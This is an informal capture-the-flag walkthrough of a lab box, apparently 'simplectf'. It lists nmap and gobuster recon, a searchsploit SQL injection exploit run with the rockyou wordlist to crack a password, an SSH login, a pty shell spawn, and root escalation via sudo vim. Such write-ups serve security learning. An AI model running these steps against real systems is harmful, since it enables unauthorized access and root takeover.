1.) I need to find how many services are running on port 1000.
	- I used nmap to scan the services on that port on that ip 
		- nmap -sV -sC ip_address
	- I found that there are two services on ports that are under 1000. 
2.) ran gobuster to find hidden directories
	- found a directory simple
		- gobuster dir -u http://10.10.178.0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

3.) using searchsploit a command-likne search tool for exploiting a databnase. 
	- since we found the terms made simple in the page source, we search in the command line, searchsploit "made simple" found a vulnerability or exploit that was useful which said sql injection.
	- located the file, then copied it to my directory.
	- opened file and found the cve.
(vulnerability is called sqli) -u 
4.) mv 46635.py exploit.py
	- this would move my password cracker in python over, where i created a new folder called simplectf for all information.
5.) ran pip install termcolor for past issues, then ran pip install 2to3
	- after ran 2to3 . -w to change all python scripts to python3.
6.) then finall ran my python script
	- python exploit.py http://ip/simple --crack -w /usr/sharee/wordlists/rockyou.txt
7.) got password and ssh into -> mitch ssh mitch@ip -p 2222
	- found user.txt and got flag
8.) to get privledge escalation we would use which
	- which python3 to find the path of python3 to run python commands
		- where we ran python3 -c 'import pty;pty.spawn("/bin/bash")' to create a new bash shell to get a fully interatice one
9.) sudo -l to find all the commands with root privledges where we get /usr/bin/vim to escalate privileges.
	- sudo vim, then :shell to drop the user into the root shell.
		- use id to check for id's lol -> root
10.) cd /root then ls to find root.txt to find the last flag!!!!!
